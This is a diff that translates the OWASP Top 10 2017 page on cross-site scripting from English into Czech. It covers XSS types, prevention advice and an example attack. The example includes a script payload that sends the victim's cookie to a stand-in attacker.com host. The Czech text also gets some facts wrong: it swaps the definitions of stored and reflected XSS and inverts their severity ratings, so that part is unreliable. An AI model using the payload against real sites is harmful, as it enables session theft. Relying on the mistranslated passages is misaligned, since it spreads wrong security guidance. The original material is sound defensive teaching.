@@ -1,43 +1,44 @@
 # A7:2017 Cross-Site Scripting (XSS)
 
-| Threat agents/Attack vectors | Security Weakness           | Impacts               |
+| Původci hrozby/Vektor útoku | Bezpečnostní slabina           | Dopady               |
 | -- | -- | -- |
-| Access Lvl : Exploitability 3 | Prevalence 3 : Detectability 3 | Technical 2 : Business |
-| Automated tools can detect and exploit all three forms of XSS, and there are freely available exploitation frameworks. | XSS is the second most prevalent issue in the OWASP Top 10, and is found in around two thirds of all applications. Automated tools can find some XSS problems automatically, particularly in mature technologies such as PHP, J2EE / JSP, and ASP.NET. | The impact of XSS is moderate for reflected and DOM XSS, and severe for stored XSS, with remote code execution on the victim's browser, such as stealing credentials, sessions, or delivering malware to the victim. |
+| Aplikačně specifické : Zneužitelnost 3 | Rozšíření 3 : Zjistitelnost 3 | Technické 2 : Obchodní |
+| Automatizované nástroje mohou detekovat a využívat všechny tři formy XSS a existují i volně dostupné frameworky. | XSS je druhým nejrozšířenějším problémem v OWASP Top 10 a nachází se v přibližně dvou třetinách všech aplikací. Automatizované nástroje mohou některé problémy XSS automaticky najít, zejména ve vyspělých technologiích, jako jsou PHP, J2EE/JSP a ASP.NET. | Dopad stored XSS a DOM XSS útoku je mírný. Pro reflected XSS je dopad vážný kvůli vzdálenému spuštění kódu v prohlížeči oběti, kdy může nastat krádež pověření, relace nebo doručení malwaru oběti. |
 
-## Is the Application Vulnerable?
+## Je aplikace zranitelná?
 
-There are three forms of XSS, usually targeting users' browsers:
+Existují tři formy XSS, obvykle zaměřené na prohlížeče uživatelů:
 
-* **Reflected XSS**: The application or API includes unvalidated and unescaped user input as part of HTML output. A successful attack can allow the attacker to execute arbitrary HTML and JavaScript in the victim’s browser. Typically the user will need to interact with some malicious link that points to an attacker-controlled page, such as malicious watering hole websites, advertisements, or similar.
-* **Stored XSS**: The application or API stores unsanitized user input that is viewed at a later time by another user or an administrator. Stored XSS is often considered a high or critical risk.
-* **DOM XSS**: JavaScript frameworks, single-page applications, and APIs that dynamically include attacker-controllable data to a page are vulnerable to DOM XSS. Ideally, the application would not send attacker-controllable data to unsafe JavaScript APIs.
+* **Stored XSS**: Aplikace nebo rozhraní API obsahuje jako součást výstupu HTML neověřený a neescapovaný vstup uživatele. Úspěšný útok může útočníkovi umožnit spustit libovolný HTML a JavaScript v prohlížeči oběti. Uživatel bude obvykle muset komunikovat s nějakým nebezpečným odkazem, který ukazuje na stránku ovládanou útočníkem, jako jsou škodlivé watering hole stránky, reklamy apod.
+* **Reflected XSS**: Aplikace nebo API ukládá nesanitovaný vstup uživatele, který si později prohlédne jiný uživatel nebo administrátor. Trvalé XSS je často považováno za vysoké nebo kritické riziko.
+* **DOM XSS**: JavaScript frameworky, single-page aplikace, a API rozhraní, které dynamicky zahrnují na stránku data kontrolovatelná útočníkem, jsou zranitelné vůči DOM XSS. V ideálním případě by aplikace neměla posílat data řízená útočníkem na nespolehlivá rozhraní API JavaScriptu.
 
-Typical XSS attacks include session stealing, account takeover, MFA bypass, DOM node replacement or defacement (such as trojan login panels), attacks against the user's browser such as malicious software downloads, key logging, and other client-side attacks.
+Typické útoky XSS zahrnují krádeže relací, převzetí účtu, MFA bypass, nahrazení nebo znehodnocení DOM (například přihlašovací panely trojských koní), útoky proti prohlížeči uživatele, například stahování škodlivého softwaru, protokolování klíčů a další útoky na straně klienta.
 
-## How To Prevent
+## Jak se mohu bránit?
 
-Preventing XSS requires separation of untrusted data from active browser content. This can be achieved by:
+Prevence XSS vyžaduje oddělení nedůvěryhodných dat od aktivního obsahu prohlížeče. Toho lze dosáhnout:
 
-* Using frameworks that automatically escape XSS by design, such as the latest Ruby on Rails, React JS. Learn the limitations of each framework's XSS protection and appropriately handle the use cases which are not covered.
-* Escaping untrusted HTTP request data based on the context in the HTML output (body, attribute, JavaScript, CSS, or URL) will resolve Reflected and Stored XSS vulnerabilities. The [OWASP  Cheat Sheet 'XSS Prevention'](https://www.owasp.org/index.php/XSS_(Cross_Site_Scripting)_Prevention_Cheat_Sheet) has details on the required data escaping techniques.
-* Applying context-sensitive encoding when modifying the browser document on the client side acts against DOM XSS. When this cannot be avoided, similar context sensitive escaping techniques can be applied to browser APIs as described in the OWASP Cheat Sheet 'DOM based XSS Prevention'.
-* Enabling a [Content Security Policy (CSP)](https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP) as a defense-in-depth mitigating control against XSS. It is effective if no other vulnerabilities exist that would allow placing malicious code via local file includes (e.g. path traversal overwrites or vulnerable libraries from permitted content delivery networks).
+* Používáním frameworků, které automaticky escapují XSS, například nejnovější Ruby on Rails, React JS. Nastudujte si jednotlivá omezení XSS ochrany u každého frameworku a případy, které nejsou ošetřeny, adekvátně vyřešte.
+* Důkladné escapování všech nedůvěryhodných dat založených na kontextu HTML (body, attribute, JavaScript, CSS, nebo URL) vyřeší reflected a stored XSS chyby. [OWASP  Cheat Sheet 'XSS Prevention'](https://www.owasp.org/index.php/XSS_(Cross_Site_Scripting)_Prevention_Cheat_Sheet)  poskytuje podrobnosti o požadovaných technikách úniku dat.
+* Použití kontextového kódování při úpravách dokumentu prohlížeče na straně klienta se jeví jako obrana proti DOM XSS. Pokud tomu nelze zabránit, podobné kontextové techniky escapování lze použít na API prohlížeče, jak je popsáno v OWASP Cheat Sheet 'DOM based XSS Prevention'.
+* Povolení [Content Security Policy (CSP)](https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP) jako hloubkové obrany zmírňující kontrolu proti XSS. Je účinná, pokud neexistují žádné další chyby zabezpečení, které by umožňovaly umisťování škodlivého kódu prostřednictvím lokálních souborů (např. přepisy procházení cest nebo zranitelné knihovny z povolených sítí pro doručování obsahu).
 
-## Example Attack Scenario
+## Příklady útočných scénářů
 
-**Scenario #1**: The application uses untrusted data in the construction of the following HTML snippet without validation or escaping:
+**Scénář #1**: Při konstrukci následujícího kousku HTML používá aplikace nedůvěryhodná data bez validace či escapování:
 
 `(String) page += "<input name='creditcard' type='TEXT' value='" + request.getParameter("CC") + "'>";`
-The attacker modifies the ‘CC’ parameter in the browser to:
+Útočník změní parametr ‘CC’ ve svém prohlížeči na:
 
 `'><script>document.location='http://www.attacker.com/cgi-bin/cookie.cgi?foo='+document.cookie</script>'`
 
-This attack causes the victim’s session ID to be sent to the attacker’s website, allowing the attacker to hijack the user’s current session.
+Tento útok způsobí odeslání ID relace oběti na webové stránky útočníka, což mu umožní unést aktuální relaci oběti.
 
-**Note**: Attackers can use XSS to defeat any automated Cross-Site Request Forgery (CSRF) defense the application might employ.
+**Poznámka**: Útočníci mohou pomocí XSS zdolat jakoukoli automatizovanou obranu Cross-Site Request Forgery (CSRF), kterou aplikace může používat.
 
-## References
+
+## Odkazy
 
 ### OWASP
 
@@ -52,7 +53,7 @@ This attack causes the victim’s session ID to be sent to the attacker’s webs
 * [OWASP Cheat Sheet: XSS Filter Evasion](https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet)
 * [OWASP Java Encoder Project](https://www.owasp.org/index.php/OWASP_Java_Encoder_Project)
 
-### External
+### Externí
 
 * [CWE-79: Improper neutralization of user supplied input](https://cwe.mitre.org/data/definitions/79.html)
 * [PortSwigger: Client-side template injection](https://portswigger.net/kb/issues/00200308_clientsidetemplateinjection)
